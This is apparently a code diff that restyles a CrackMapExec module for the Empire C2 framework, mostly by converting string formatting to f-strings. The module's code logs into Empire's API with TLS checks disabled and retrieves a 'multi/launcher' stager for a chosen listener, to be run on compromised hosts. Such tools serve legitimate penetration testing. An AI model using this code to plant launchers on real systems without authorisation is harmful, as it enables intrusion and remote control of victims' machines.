@@ -23,7 +23,7 @@ class CMEModule:
             LISTENER    Listener name to generate the launcher for
         '''
 
-        if not 'LISTENER' in module_options:
+        if 'LISTENER' not in module_options:
             context.log.error('LISTENER option is required!')
             sys.exit(1)
 
@@ -31,14 +31,21 @@ class CMEModule:
 
         headers = {'Content-Type': 'application/json'}
         #Pull the host and port from the config file
-        base_url = 'https://{}:{}'.format(context.conf.get('Empire', 'api_host'), context.conf.get('Empire', 'api_port'))
+        base_url = f"https://{context.conf.get('Empire', 'api_host')}:{context.conf.get('Empire', 'api_port')}"
+
 
         try:
             #Pull the username and password from the config file
             payload = {'username': context.conf.get('Empire', 'username'),
                        'password': context.conf.get('Empire', 'password')}
 
-            r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)
+            r = requests.post(
+                f'{base_url}/api/admin/login',
+                json=payload,
+                headers=headers,
+                verify=False,
+            )
+
             if r.status_code == 200:
                 token = r.json()['token']
             else:
@@ -46,19 +53,28 @@ class CMEModule:
                 sys.exit(1)
 
             payload = {'StagerName': 'multi/launcher', 'Listener': module_options['LISTENER']}
-            r = requests.post(base_url + '/api/stagers?token={}'.format(token), json=payload, headers=headers, verify=False)
-            
+            r = requests.post(
+                base_url + f'/api/stagers?token={token}',
+                json=payload,
+                headers=headers,
+                verify=False,
+            )
+
+
             response = r.json()
             if "error" in response:
-                context.log.error("Error from empire : {}".format(response["error"]))
+                context.log.error(f'Error from empire : {response["error"]}')
                 sys.exit(1)
 
             self.empire_launcher = response['multi/launcher']['Output']
 
-            context.log.success("Successfully generated launcher for listener '{}'".format(module_options['LISTENER']))
+            context.log.success(
+                f"Successfully generated launcher for listener '{module_options['LISTENER']}'"
+            )
+
 
         except ConnectionError as e:
-            context.log.error("Unable to connect to Empire's RESTful API: {}".format(e))
+            context.log.error(f"Unable to connect to Empire's RESTful API: {e}")
             sys.exit(1)
 
     def on_admin_login(self, context, connection):
